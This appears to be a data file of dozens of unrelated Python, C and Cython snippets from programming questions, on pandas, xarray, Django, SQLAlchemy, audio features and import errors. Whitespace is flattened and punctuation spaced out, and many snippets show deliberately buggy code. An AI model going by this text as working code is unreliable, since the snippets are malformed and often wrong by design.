"import bob.apimport numpy as npfrom scipy.io.wavfile import readfrom sklearn import preprocessingfrom python_speech_features import mfcc , delta , logfbankdef bob_extract_features ( audio , rate ) : # get MFCC rate = 8000 # rate win_length_ms = 30 # The window length of the cepstral analysis in milliseconds win_shift_ms = 10 # The window shift of the cepstral analysis in milliseconds n_filters = 26 # The number of filter bands n_ceps = 13 # The number of cepstral coefficients f_min = 0 . # The minimal frequency of the filter bank f_max = 4000 . # The maximal frequency of the filter bank delta_win = 2 # The integer delta value used for computing the first and second order derivatives pre_emphasis_coef = 0.97 # The coefficient used for the pre-emphasis dct_norm = True # A factor by which the cepstral coefficients are multiplied mel_scale = True # Tell whether cepstral features are extracted on a linear ( LFCC ) or Mel ( MFCC ) scale c = bob.ap.Ceps ( rate , win_length_ms , win_shift_ms , n_filters , n_ceps , f_min , f_max , delta_win , pre_emphasis_coef , mel_scale , dct_norm ) c.with_delta = False c.with_delta_delta = False c.with_energy = False signal = np.cast [ 'float ' ] ( audio ) # vector should be in **float** example_mfcc = c ( signal ) # mfcc + mfcc ' + mfcc '' return example_mfccdef psf_extract_features ( audio , rate ) : signal = np.cast [ 'float ' ] ( audio ) # vector should be in **float** mfcc_feature = mfcc ( signal , rate , winlen = 0.03 , winstep = 0.01 , numcep = 13 , nfilt = 26 , nfft = 512 , appendEnergy = False ) # mfcc_feature = preprocessing.scale ( mfcc_feature ) deltas = delta ( mfcc_feature , 2 ) fbank_feat = logfbank ( audio , rate ) combined = np.hstack ( ( mfcc_feature , deltas ) ) return mfcc_featuretrack = 'test-sample.wav'rate , audio = read ( track ) features1 = psf_extract_features ( audio , rate ) features2 = bob_extract_features ( audio , rate ) print ( `` -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- '' ) t = ( features1 == features2 ) print ( t )"
"float lon ( lon ) ; lon : _FillValue = NaNf ; lon : long_name = `` Longitude '' ; lon : standard_name = `` longitude '' ; lon : short_name = `` lon '' ; lon : units = `` degrees_east '' ; lon : axis = `` X '' ; lon : valid_min = -180.f ; lon : valid_max = 180.f ; float lat ( lat ) ; lat : _FillValue = NaNf ; lat : long_name = `` Latitude '' ; lat : standard_name = `` latitude '' ; lat : short_name = `` lat '' ; lat : units = `` degrees_north '' ; lat : axis = `` Y '' ; lat : valid_min = -90.f ; lat : valid_max = 90.f ; double time ( time ) ; time : _FillValue = NaN ; time : standard_name = `` time '' ; time : units = `` days since 2006-01-01 '' ; time : calendar = `` gregorian '' ; import numpy as npimport xarray as xrimport pandas as pdimport datetime as dtlons = np.arange ( -75 , -70 , .5 ) .astype ( np.float32 ) lats = np.arange ( 40,42 , .25 ) .astype ( np.float32 ) [ x , y ] = np.meshgrid ( lons , lats ) u = np.random.randn ( 1 , 8 , 10 ) .astype ( np.float32 ) v = np.random.randn ( 1 , 8 , 10 ) .astype ( np.float32 ) time_index = pd.date_range ( dt.datetime.now ( ) , periods=1 ) ds = xr.Dataset ( ) coords = ( 'time ' , 'lat ' , 'lon ' ) ds [ ' u ' ] = ( coords , np.float32 ( u ) ) ds [ ' v ' ] = ( coords , np.float32 ( v ) ) ds.coords [ 'lon ' ] = lonsds.coords [ 'lat ' ] = latsds.coords [ 'time ' ] = time_indexencoding = { 'lat ' : { 'zlib ' : False } , 'lon ' : { 'zlib ' : False } , ' u ' : { '_FillValue ' : -999.0 , 'chunksizes ' : ( 1 , 8 , 10 ) , 'complevel ' : 1 , 'zlib ' : True } } ds.to_netcdf ( 'test.nc ' , encoding=encoding )"
content = Column ( LargeBinary ) table = File.__table__field = table.c [ `` content '' ] print ( `` max= '' + field.type.length )
"class Point : def __init__ ( self , x = 0 , y = 0 , visited = False , isnoise = False ) : self.x = x self.y = y self.visited = False self.isnoise = False def show ( self ) : return self.x , self.y def dist ( self , p1 , p2 ) : # Calculate the great circle distance between two points on the earth ( specified in decimal degrees ) return distance between two point # convert decimal degrees to radians dlat = radians ( p2.x-p1.x ) dlon = radians ( p2.y-p1.y ) a = sin ( dlat/2 ) * sin ( dlat/2 ) + cos ( radians ( p1.x ) ) * cos ( radians ( p2.x ) ) * sin ( dlon/2 ) * sin ( dlon/2 ) c = 2 * atan2 ( sqrt ( a ) , sqrt ( 1-a ) ) d = 6371 * c return d def distanceQuery ( self , neighbor_pts ) : dista= [ ] for i in range ( len ( neighbor_pts ) ) : for j in range ( i+1 , len ( neighbor_pts ) ) : z=self.dist ( neighbor_pts [ i ] , neighbor_pts [ j ] ) dista.append ( z ) return max ( dista ) def expandCluster ( self , P , neighbor_points ) : self.cluster [ self.cluster_inx ] .append ( P ) iterator = iter ( neighbor_points ) while True : try : npoint_tmp = iterator.next ( ) except StopIteration : # StopIteration exception is raised after last element break if ( not npoint_tmp.visited ) : # for each point P ' in NeighborPts npoint_tmp.visited = True NeighborPts_ = self.regionQuery ( npoint_tmp ) if ( len ( NeighborPts_ ) > = self.MinPts ) : for j in range ( len ( NeighborPts_ ) ) : neighbor_points.append ( NeighborPts_ [ j ] ) if self.distanceQuery ( neighbor_points ) > 0.10 : break"
"# lib.pxd ( C library definitions ) cdef extern from `` lib.h '' : ctypedef struct c_context : pass # file py_context.pxdfrom lib cimport c_contextcdef class py_context : cdef c_context *context cdef create ( cls , c_context *context ) cdef c_context* get ( self ) # file py_context.pyxdef class py_context : @ staticmethod cdef create ( cls , c_context *c ) : cls = py_nfc_context ( ) cls.context = c return cls cdef c_context* get ( self ) : return self.context"
/main_package/ __init__.py script1.py sub_package/ __init__.py model.py import main_package.script1 ... from sub_package import model ... script.py/MCMC2/ __init__.py main_script.py ExoData.py Models/ __init__.py model_main.py ImportError Traceback ( most recent call last ) /home/usr/script.py in < module > ( ) 1 import pymc -- -- > 2 from MCMC2 import ExoData ... /home/usr/MCMC2/__init__.py in < module > ( ) ... -- -- > 4 import MCMC2.main_script ... /home/usr/MCMC2/main_script.py in < module > ( ) 1 try : from Models import model_main -- -- > 2 except : from .Models import model_main ... /home/usr/MCMC2/Models/__init__.py in < module > ( ) -- -- > 1 import Models.model_main ... ImportError : No module named 'Models '
"pairs = [ ( 2 , '' dog '' ) , ( 1 , `` cat '' ) , ( 3 , `` dragon '' ) , ( 1 , `` tiger '' ) ] # Returns the PAIR ( not the number ) that minimizes on pair [ 0 ] min_pair = min ( pairs , key=lambda pair : pair [ 0 ] ) # this will return ( 1 , 'cat ' ) , NOT 1 class Animal { public string name ; public int age ; }"
1 2 34 5 67 8 91 1 2 2 3 31 1 2 2 3 34 4 5 5 6 64 4 5 5 6 67 7 8 8 9 97 7 8 8 9 9
< div class= '' 12 '' > < div class= '' something '' > < /div > < /div > < div class= '' 12 '' > < div class= '' 34 '' > < span > TODAY < /span > < /div > < /div > < div class= '' 12 '' > < div class= '' something '' > < /div > < /div > < div class= '' 12 '' > < div class= '' something '' > < /div > < /div >
This is a lineThat sucksThat sucksThat sucksThis is a line # Variable for text filetext_database = './text_database.txt ' ... with open ( text_database ) as f : lines = f.readlines ( ) print ( random.choice ( lines ) ) with open ( text_database ) as f : lines_list = [ ] lines = f.readlines ( ) random_tmp = random.choice ( lines ) if random_tmp not in lines_list : lines_list.append ( random_tmp ) print ( random_tmp )
"class SlideForm ( ModelForm ) : class Meta : model = Slide class HiddenSlideForm ( SlideForm ) : def __init__ ( self , *args , **kwargs ) : super ( HiddenSlideForm , self ) .__init__ ( *args , **kwargs ) for name , field in self.fields.iteritems ( ) : field.widget = field.hidden_widget ( ) field.required = False class DeckForm ( ModelForm ) : def __init__ ( self , *args , **kwargs ) : # do some stuff here return super ( DeckForm , self ) .__init__ ( *args , **kwargs ) class Meta : model = Deck # other stuff here class HiddenDeckForm ( DeckForm ) : def __init__ ( self , *args , **kwargs ) : super ( HiddenDeckForm , self ) .__init__ ( *args , **kwargs ) for name , field in self.fields.iteritems ( ) : field.widget = field.hidden_widget ( ) field.required = False"
"C : \VersionControl\PythonScripts\Source\src\_build\script_export_pdf.rst:4 : WARNING : autodoc : failed to import module u'gis.scripts.script_export_pdf ' ; the following exception was raised : Traceback ( most recent call last ) : File `` C : \VersionControl\PythonScripts\Source\src\lib\Python27\ArcGIS10.1\lib\site-packages\sphinx\ext\autodoc.py '' , line 335 , in import_object __import__ ( self.modname ) File `` C : \VersionControl\PythonScripts\Source\src\gis\scripts\script_export_pdf.py '' , line 76 , in < module > mxd.ExportToPDF ( in_mxds , out_folder , overwrite , current ) File `` C : \VersionControl\PythonScripts\Source\src\gis\mapping\mxd.py '' , line 315 , in ExportToPDF _ExportToPDF ( arcpy.mapping.MapDocument ( m ) , out_folder , overwrite ) File `` C : \Program Files ( x86 ) \ArcGIS\Desktop10.1\arcpy\arcpy\arcobjects\mixins.py '' , line 609 , in __init__ assert ( os.path.isfile ( mxd ) or ( mxd.lower ( ) == `` current '' ) ) , gp.getIDMessage ( 89004 , `` Invalid MXD filename '' ) AssertionError : Invalid MXD filename ."
some_id2016-12-26 11:03:10 0012016-12-26 11:03:13 0012016-12-26 12:03:13 0012016-12-26 12:03:13 0082016-12-27 11:03:10 0092016-12-27 11:03:13 0092016-12-27 12:03:13 0032016-12-27 12:03:13 011 some_id size2016-12-26 001 3 008 12016-12-27 009 2 003 1
Main process ( or thread ? ) - start & initialize | V spaw child -- -- -- -- -- -- -- -- -- -- -- > start & initialize | | V V while ( 1 ) < -- -- -- -- -- -- + wait for data < -- -- -- + | | | | V | V | read file descriptors | read from | | | serial port < -- -- -+ | V | | | | value changed ? -- -- -- No -- + V | | | ^ message done ? -- No-+ | V | | | Report change -- -- -- -- -- -- + V | over serial alert parent -- -- -- -- -+
"import numpy as npdef norm_loop ( M , v ) : n = M.shape [ 0 ] d = np.zeros ( n ) for i in range ( n ) : d [ i ] = np.sum ( ( M [ i ] - v ) **2 ) return ddef norm_bcast ( M , v ) : n = M.shape [ 0 ] d = np.zeros ( n ) d = np.sum ( ( M - v ) **2 , axis=1 ) return dM = np.random.random_sample ( ( 1000 , 10000 ) ) v = M [ 0 ] % timeit norm_loop ( M , v ) 25.9 ms % timeit norm_bcast ( M , v ) 38.5 ms"
"class RFPDupeFilter ( BaseDupeFilter ) : def request_seen ( self , request ) : fp = self.request_fingerprint ( request ) if fp in self.fingerprints : return True self.fingerprints.add ( fp ) if self.file : self.file.write ( fp + os.linesep )"
"df = pd.DataFrame ( data= [ [ 1 , ' a ' ] , [ 2 , ' a ' ] , [ 3 , ' b ' ] , [ 3 , ' b ' ] , [ 1 , ' b ' ] , [ 1 , ' b ' ] ] , columns= [ 'number ' , 'letter ' ] ) Expected output : ( 1 , a ) ( 2 , a ) ( 3 , b ) ( 1 , b )"
"# Using a generator expression as the argument to list ( ) fails > > > class Brie : ... base = 2 ... powers = list ( base**i for i in xrange ( 5 ) ) ... Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > File `` < stdin > '' , line 3 , in Brie File `` < stdin > '' , line 3 , in < genexpr > NameError : global name 'base ' is not defined # Using a list comprehension works > > > class Cheddar : ... base = 2 ... powers = [ base**i for i in xrange ( 5 ) ] ... > > > Cheddar.powers [ 1 , 2 , 4 , 8 , 16 ] # Using a list comprehension as the argument to list ( ) works > > > class Edam : ... base = 2 ... powers = list ( [ base**i for i in xrange ( 5 ) ] ) ... > > > Edam.powers [ 1 , 2 , 4 , 8 , 16 ]"
for state in states : score += penalty if state == bad else bonus
.gitignore.gitconfig.gitattributesipynb_drop_output.pyMyNotebook.ipynb *.ipynb filter=clean_ipynb [ filter `` clean_ipynb '' ] clean = ipynb_drop_output.py smudge = cat
result = a if a > b else b result = a > b and a or b
"def articles ( request ) : model = News.objects.all ( ) # getting News objects list modelSerialize = serializers.serialize ( 'json ' , News.objects.all ( ) ) random_generator = random.randint ( 1 , News.objects.count ( ) ) context = { 'models ' : modelSerialize , 'title ' : 'Articles ' , 'num_of_objects ' : News.objects.count ( ) , 'random_order ' : random.randint ( 1 , random_generator ) , 'random_object ' : News.objects.get ( id = random_generator ) , 'first4rec ' : model [ 0:4 ] , 'next4rec ' : model [ 4 : ] , } return render ( request , 'articles.html ' , context )"
# X - 3000 by 100 bool np.array # Y - 10000 by 100 bool np.arrayhd = [ ] i=1for x in X : print ( `` object nr `` + str ( i ) + `` / '' + str ( len ( X ) ) ) arr = np.array ( [ x ] * len ( Y ) ) C = Y^arr # just xor this array by all the arrays in the other group simultainously hd.append ( [ sum ( c ) for c in C ] ) # add up all the bits to get the hamming distance i+=1return np.array ( hd )
"PyObject* script ; PyObject* scriptRun ; PyObject* scriptResult ; // import modulescript = PyImport_ImportModule ( `` pythonScript '' ) ; // get function objectsscriptRun = PyObject_GetAttrString ( script , `` run '' ) ; // call function without/empty argumentsscriptResult = PyObject_CallFunctionObjArgs ( scriptRun , NULL ) ; if ( scriptResult == NULL ) cout < < `` scriptResult = null '' < < endl ; else cout < < `` scriptResult ! = null '' < < endl ; cout < < `` print reference count : `` < < scriptResult- > ob_refcnt < < endl ; def run ( ) : return 1 scriptResult ! = nullprint reference count : 72"
"< xarray.Dataset > Dimensions : ( lat : 360 , lon : 720 , time : 365 ) Coordinates : * lon ( lon ) float32 -179.75 -179.25 -178.75 -178.25 -177.75 -177.25 ... * lat ( lat ) float32 89.75 89.25 88.75 88.25 87.75 87.25 86.75 86.25 ... * time ( time ) datetime64 [ ns ] 2007-01-01 2007-01-02 2007-01-03 ... Data variables : dis ( time , lat , lon ) float64 nan nan nan nan nan nan nan nan nan ... flist1 = [ 1,2,3 ] ds_new = xr.concat ( [ xr.open_dataset ( filestrF [ 0,1,1 , f ] ) for f in flist1 ] , dim='time ' ) Dimensions : ( lat : 360 , lon : 720 , time : 1095 ) ds_new.to_netcdf ( 'saved_on_disk1.nc ' )"
"cdef extern from `` stdint.h '' : ctypedef unsigned long long uint64_tcdef extern from `` glpk.h '' : ctypedef struct glp_tree : passcdef void callback_func ( glp_tree* tree , void *info ) : treeobj = Tree ( < uint64_t > tree ) // cast to an integer ... cdef class Tree : cdef glp_tree* ptr def __init__ ( self , uint64_t ptr ) : self.ptr = < glp_tree* > ptr // ... and back to a pointer Can not convert 'glp_tree * ' to Python object"
"ranked = df [ [ 'period_id ' , 'sector_name ' ] + to_rank ] .groupby ( [ 'period_id ' , 'sector_name ' ] ) .transform ( lambda x : ( x.rank ( ascending = True ) - 1 ) *100/len ( x ) ) import pandas as pdimport numpy as npimport randomto_rank = [ 'var_1 ' , 'var_2 ' , 'var_3 ' ] df = pd.DataFrame ( { 'var_1 ' : np.random.randn ( 1000 ) , 'var_2 ' : np.random.randn ( 1000 ) , 'var_3 ' : np.random.randn ( 1000 ) } ) df [ 'date_id ' ] = np.random.choice ( range ( 2001 , 2012 ) , df.shape [ 0 ] ) df [ 'category ' ] = ' , '.join ( chr ( random.randrange ( 97 , 97 + 4 + 1 ) ) .upper ( ) for x in range ( 1 , df.shape [ 0 ] +1 ) ) .split ( ' , ' ) def rank_fun ( df , to_rank ) : # calls ranking function f ( x ) to rank each category at each date # extra data tidying logic here beyond scope of question - can remove ranked = df [ to_rank ] .apply ( lambda x : f ( x ) ) return rankeddef f ( x ) : nans = x [ np.isnan ( x ) ] # Remove nans as these will be ranked with 50 sub_df = x.dropna ( ) # nans_ranked = nans.replace ( np.nan , 50 ) # give nans rank of 50 if len ( sub_df.index ) == 0 : # check not all nan . If no non-nan data , then return with rank 50 return nans_ranked if len ( sub_df.unique ( ) ) == 1 : # if all data has same value , return rank 50 sub_df [ : ] = 50 return sub_df # Check that we do n't have too many clustered values , such that we ca n't bin due to overlap of ties , and reduce bin size provided we can at least quintile rank . max_cluster = sub_df.value_counts ( ) .iloc [ 0 ] # value_counts sorts by counts , so first element will contain the max max_bins = len ( sub_df ) / max_cluster if max_bins > 100 : # if largest cluster < 1 % of available data , then we can percentile_rank max_bins = 100 if max_bins < 5 : # if we do n't have the resolution to quintile rank then assume no data . sub_df [ : ] = 50 return sub_df bins = int ( max_bins ) # bin using highest resolution that the data supports , subject to constraints above ( max 100 bins , min 5 bins ) sub_df_ranked = pd.qcut ( sub_df , bins , labels=False ) # currently using pd.qcut . pd.rank ( seems to have extra functionality , but overheads similar in practice sub_df_ranked *= ( 100 / bins ) # Since we bin using the resolution specified in bins , to convert back to decile rank , we have to multiply by 100/bins . E.g . with quintiles , we 'll have scores 1 - 5 , so have to multiply by 100 / 5 = 20 to convert to percentile ranking ranked_df = pd.concat ( [ sub_df_ranked , nans_ranked ] ) return ranked_df # ensure do n't get duplicate columns if ranking already executedranked_cols = [ col + '_ranked ' for col in to_rank ] ranked = df [ [ 'date_id ' , 'category ' ] + to_rank ] .groupby ( [ 'date_id ' , 'category ' ] , as_index = False ) .apply ( lambda x : rank_fun ( x , to_rank ) ) ranked.columns = ranked_cols ranked.reset_index ( inplace = True ) ranked.set_index ( 'level_1 ' , inplace = True ) df = df.join ( ranked [ ranked_cols ] ) 2 def tst_fun ( df , field ) : 3 1 685 685.0 0.2 x = df [ field ] 4 1 20726 20726.0 5.8 nans = x [ np.isnan ( x ) ] 5 1 28448 28448.0 8.0 sub_df = x.dropna ( ) 6 1 387 387.0 0.1 nans_ranked = nans.replace ( np.nan , 50 ) 7 1 5 5.0 0.0 if len ( sub_df.index ) == 0 : 8 pass # check not empty . May be empty due to nans for first 5 years e.g . no revenue/operating margin data pre 1990 9 return nans_ranked10 11 1 65559 65559.0 18.4 if len ( sub_df.unique ( ) ) == 1 : 12 sub_df [ : ] = 50 # e.g . for subranks where all factors had nan so ranked as 50 e.g . in 199013 return sub_df14 15 # Finally , check that we do n't have too many clustered values , such that we ca n't bin , and reduce bin size provided we can at least quintile rank.16 1 74610 74610.0 20.9 max_cluster = sub_df.value_counts ( ) .iloc [ 0 ] # value_counts sorts by counts , so first element will contain the max17 # print ( counts ) 18 1 9 9.0 0.0 max_bins = len ( sub_df ) / max_cluster # 19 20 1 3 3.0 0.0 if max_bins > 100 : 21 1 0 0.0 0.0 max_bins = 100 # if largest cluster < 1 % of available data , then we can percentile_rank22 23 24 1 0 0.0 0.0 if max_bins < 5 : 25 sub_df [ : ] = 50 # if we do n't have the resolution to quintile rank then assume no data.26 27 # return sub_df28 29 1 1 1.0 0.0 bins = int ( max_bins ) # bin using highest resolution that the data supports , subject to constraints above ( max 100 bins , min 5 bins ) 30 31 # should track bin resolution for all data . To add.32 33 # if get here , then neither nans_ranked , nor sub_df are empty34 # sub_df_ranked = pd.qcut ( sub_df , bins , labels=False ) 35 1 160530 160530.0 45.0 sub_df_ranked = ( sub_df.rank ( ascending = True ) - 1 ) *100/len ( x ) 36 37 1 5777 5777.0 1.6 ranked_df = pd.concat ( [ sub_df_ranked , nans_ranked ] ) 38 39 1 1 1.0 0.0 return ranked_df"
"request_url = furl ( 'http : //www.domain.com/service/ ' ) \ .add ( { 'format ' : 'json ' , 'location ' : address_line_1 + ' , ' + city + ' , ' + state , 'key ' : APP_KEY } ) .url"
backend __init__.py conf.py db.py connections.py /api __init__.py register.py api.py /scheduled __init__.py helpers.py from backend.conf import *from backend.connections import * ImportError : No module named backend.conf ValueError : Attempted relative import in non-package
> > > x = 5 > > > y = 5 > > > x == y == 5True > > > x = 5 > > > y = 5 > > > x == y and x == 5True > > > x = 5 > > > y = 5 > > > x == y == 4False > > > x = 5 > > > y = 5 > > > x == y and x == 4False
"i=7j=8k=10def test ( ) : i=1 j=2 k=3 return dict ( ( name , eval ( name ) ) for name in [ ' i ' , ' j ' , ' k ' ] ) > > > test ( ) { ' i ' : 7 , ' k ' : 10 , ' j ' : 8 }"
"In [ 34 ] : import pandas as pdimport numpy as npdf2 = pd.DataFrame ( { ' A ' : [ 1 , 1 , 1 , 2 , 2 , 2 ] , ' B ' : [ 1 , 0 , 1 , 1 , 0 , 0 ] } ) df = pd.DataFrame ( { ' A ' : [ 0 , 1 , 2 , 3 , 4 , 5 ] , 'B1 ' : [ 1 , np.nan , np.nan , 8 , 9 , 1 ] , 'B2 ' : [ 1 , np.nan , np.nan , 7 , 6 , 1 ] , 'B3 ' : [ 1 , np.nan , np.nan , 8 , 7 , 1 ] } ) df=df.set_index ( [ ' A ' ] ) df2=df2.set_index ( [ ' A ' ] ) In [ 35 ] : dfOut [ 35 ] : B1 B2 B3A 0 1 1 11 NaN NaN NaN2 NaN NaN NaN3 8 7 84 9 6 75 1 1 1In [ 36 ] : df2Out [ 36 ] : BA 1 11 01 12 12 02 0 In [ 38 ] : dfOut [ 38 ] : B1 B2 B3A 0 1 1 11 1 0 12 1 0 03 8 7 84 9 6 75 1 1 1 In [ 37 ] : count=1seen= [ ] for t in range ( 0 , len ( df2 ) ) : if df2.index [ t ] not in seen : count=1 seen.append ( df2.index [ t ] ) else : count=count+1 tofill=pd.DataFrame ( df2.iloc [ t ] ) .transpose ( ) tofill_dict= { `` B '' +str ( count ) : tofill.B } df=df.fillna ( value=tofill_dict )"
"brand_raw.head ( ) brand_name0 Nike1 Lacoste2 Adidas object_raw.head ( ) category_id object_name0 24 T-shirt1 45 Shorts2 32 Dress to_raw.head ( ) category_id object_name brand_name0 24 T-shirt Nike1 45 Shorts Nike2 32 Dress Nike3 24 T-shirt Lacoste4 45 Shorts Lacoste5 32 Dress Lacoste6 24 T-shirt Adidas7 45 Shorts Adidas8 32 Dress Adidas 0 24 T-shirt Nike1 45 Shorts Nike2 32 Dress Nike def insert_value_in_every_row ( input_df , output_df , column_name ) : for row in input_df.values : row = row [ 0 ] .rstrip ( ) output_df [ column_name ] = output_df [ column_name ] .apply ( lambda x : row ) return output_dfinsert_value_in_every_row ( brand_raw , to_raw , 'brand_name ' )"
"def findMin ( listOfElements ) : for el in listOfElements : if el < min : min = elimport ppmin = 0myList = range ( 100000 ) job_server = pp.Server ( ) f1 = job_server.submit ( findMin , myList [ 0:25000 ] ) f2 = job_server.submit ( findMin , myList [ 25000:50000 ] ) f3 = job_server.submit ( findMin , myList [ 50000:75000 ] ) f4 = job_server.submit ( findMin , myList [ 75000:100000 ] ) l = Lock ( ) if ( el < min ) : l.acquire if ( el < min ) : min = el l.release"
"import numpy as npimport matplotlib.pyplot as pltx = np.asarray ( [ 1.0 , 2.0 , 3.0 , 4.0 , 5.0 ] ) y = np.asarray ( [ 1.0 , 2.0 , 3.0 , 4.0 , 5.0 ] ) xerr = np.asarray ( [ 0.2 , 0.4 , 0.6 , 0.8 , 1.0 ] ) yerr = np.asarray ( [ 0.1 , 0.2 , 0.3 , 0.4 , 0.5 ] ) plt.fill_between ( x , y-yerr , y+yerr , alpha=0.5 ) plt.fill_between ( y , x-xerr , x+xerr , alpha=0.5 ) plt.show ( )"
def phred64ToStdqual ( qualin ) : return ( `` .join ( [ chr ( ord ( x ) -31 ) for x in qualin ] ) ) ctoi = { } itoc = { } for i in xrange ( 127 ) : itoc [ i ] =chr ( i ) ctoi [ chr ( i ) ] =idef phred64ToStdqual2 ( qualin ) : return ( `` .join ( [ itoc [ ctoi [ x ] -31 ] for x in qualin ] ) )
"words = [ 'cat ' , 'window ' , 'defenestrate ' ] newList = words [ : ] # new objects are created ; a.k.a . deep copynewList [ 0 ] = 'dog'print ( words ) # [ 'cat ' ... print ( newList ) # [ 'dog ' ... Assignment to slices is also possible , and this can even change the size of the list or clear it entirely : > > > > > > letters = [ ' a ' , ' b ' , ' c ' , 'd ' , ' e ' , ' f ' , ' g ' ] > > > letters [ ' a ' , ' b ' , ' c ' , 'd ' , ' e ' , ' f ' , ' g ' ] > > > # replace some values > > > letters [ 2:5 ] = [ ' C ' , 'D ' , ' E ' ] > > > letters [ ' a ' , ' b ' , ' C ' , 'D ' , ' E ' , ' f ' , ' g ' ] > > > # now remove them > > > letters [ 2:5 ] = [ ] > > > letters [ ' a ' , ' b ' , ' f ' , ' g ' ] > > > # clear the list by replacing all the elements with an empty list > > > letters [ : ] = [ ] > > > letters [ ]"
"up_n = lambda path , n : '/'.join ( path.split ( '/ ' ) [ : -n ] )"
"df = pd.DataFrame ( { ' a ' : [ np.nan , 2 , np.nan , 4 ] , ' b ' : [ 11 , 12 , 13 , 14 ] } ) a b0 NaN 111 2 122 NaN 133 4 14 a b0 NaN NaN1 2 122 NaN NaN3 4 14 df.b.where ( ~df.a.isnull ( ) , np.nan )"
"from artist.models import Performancefrom location.models import Locationdef lazy_discover_foreign_id_choices ( ) : choices = [ ] performances = Performance.objects.all ( ) choices += { performance.id : str ( performance ) for performance in performances } .items ( ) locations = Location.objects.all ( ) choices += { location.id : str ( location ) for location in locations } .items ( ) return choiceslazy_discover_foreign_id_choices = lazy ( lazy_discover_foreign_id_choices , list ) class DiscoverEntry ( Model ) : foreign_id = models.PositiveIntegerField ( 'Foreign Reference ' , choices=lazy_discover_foreign_id_choices ( ) , )"
"> > > def get_value ( k ) : ... print `` heavy computation for '' , k ... return { `` a '' : 100 , `` b '' : 30 , `` c '' : 50 , `` d '' : 0 } [ k ] ... > > > items = [ ' a ' , ' b ' , ' c ' , 'd ' ] > > > items.sort ( key=get_value ) heavy computation for aheavy computation for bheavy computation for cheavy computation for d > > > items [ 'd ' , ' b ' , ' c ' , ' a ' ]"
import a.cimport a.b PYTHONPATH= $ PYTHONPATH : X : Y python > > > import a.b # works > > > import a.c # fails PYTHONPATH= $ PYTHONPATH : Y : X python > > > import a.b # fails > > > import a.c # works
"matches = [ [ [ 'rootrank ' , 'Root ' ] , [ 'domain ' , 'Bacteria ' ] , [ 'phylum ' , 'Firmicutes ' ] , [ 'class ' , 'Clostridia ' ] , [ 'order ' , 'Clostridiales ' ] , [ 'family ' , 'Lachnospiraceae ' ] , [ 'genus ' , 'Lachnospira ' ] ] , [ [ 'rootrank ' , 'Root ' ] , [ 'domain ' , 'Bacteria ' ] , [ 'phylum ' , ' '' Proteobacteria '' ' ] , [ 'class ' , 'Gammaproteobacteria ' ] , [ 'order ' , ' '' Vibrionales '' ' ] , [ 'family ' , 'Vibrionaceae ' ] , [ 'genus ' , 'Catenococcus ' ] ] , [ [ 'rootrank ' , 'Root ' ] , [ 'domain ' , 'Archaea ' ] , [ 'phylum ' , ' '' Euryarchaeota '' ' ] , [ 'class ' , ' '' Methanomicrobia '' ' ] , [ 'order ' , 'Methanomicrobiales ' ] , [ 'family ' , 'Methanomicrobiaceae ' ] , [ 'genus ' , 'Methanoplanus ' ] ] ] class Node ( object ) : `` '' '' Generic n-ary tree node object Children are additive ; no provision for deleting them . '' '' '' def __init__ ( self , parent , category=None , name=None ) : self.parent = parent self.category = category self.name = name self.childList = [ ] if parent is None : self.birthOrder = 0 else : self.birthOrder = len ( parent.childList ) parent.childList.append ( self ) def fullPath ( self ) : `` '' '' Returns a list of children from root to self '' '' '' result = [ ] parent = self.parent kid = self while parent : result.insert ( 0 , kid ) parent , kid = parent.parent , parent return result def ID ( self ) : return ' { 0 } | { 1 } '.format ( self.category , self.name ) node = Nonefor match in matches : for branch in match : category , name = branch node = Node ( node , category , name ) print [ n.ID ( ) for n in node.fullPath ( ) ]"
"engine = create_engine ( 'mysql : // { } : { } @ { } / { } '.format ( username , password , host , schema ) , pool_recycle=3600 ) Session = sessionmaker ( bind=engine ) session = Session ( ) metadata = MetaData ( )"
"from collections import defaultdictaa=defaultdict ( str ) bb=defaultdict ( str ) aa [ 'foo ' ] += ' 1'bb [ 'bar ' ] += ' 2'cc = { **aa , **bb } type ( cc )"
"class Foo : def __getitem__ ( self , item ) : print ( `` ? '' ) return 1f = Foo ( ) 1 in f # prints one ? and returns True5 in f # prints ? forever until you raise a Keyboard Exception # Edit : eventually this fails with OverflowError : iter index too large"
"@ bp.route ( '/ < post_id > ' ) @ login_requireddef post ( post_id ) : `` '' '' find the post and then show it `` '' '' p = Post.query.get ( post_id ) return render_template ( `` post/single_post.html '' , post=p ) class Post ( db.Model ) : __tablename__ = 'posts ' id = db.Column ( db.Integer , primary_key=True ) title = db.Column ( db.String ) html = db.Column ( db.String ) @ property def slugified_title ( ) : return slugify ( self.title , separator= '' _ '' , to_lower=True )"
"def get_one_sided_cuts ( G , A , B ) : # get all cuts that consist of nodes exclusively from B which disconnect # nodes from A one_sided_cuts = [ ] seen = [ ] l = list ( combinations ( A , 2 ) ) for x in l : s = x [ 0 ] t = x [ 1 ] cut = connectivity.minimum_st_node_cut ( G , s , t ) if set ( cut ) .issubset ( B ) and ( cut not in seen ) : one_sided_cuts.append ( cut ) seen.append ( cut ) # find minimum cut size cur_min = float ( `` inf '' ) for i in one_sided_cuts : if len ( i ) < cur_min : cur_min = len ( i ) one_sided_cuts = [ x for x in one_sided_cuts if len ( x ) == cur_min ] return one_sided_cuts"
"from ctypes import WinDLLnvapi = WinDLL ( `` nvapi.dll '' ) print nvapi # < WinDLL 'nvapi.dll ' , handle 718a0000 at 27c0050 > print nvapi.nvapi_QueryInterface # < _FuncPtr object at 0x026D8E40 > print nvapi.nvapi_QueryInterface ( ) # returns 0print nvapi.NvAPI_Initialize # AttributeError : function 'NvAPI_Initialize ' not foundprint nvapi.NvAPI_SYS_GetChipSetInfo # AttributeError : function 'NvAPI_SYS_GetChipSetInfo ' not found"
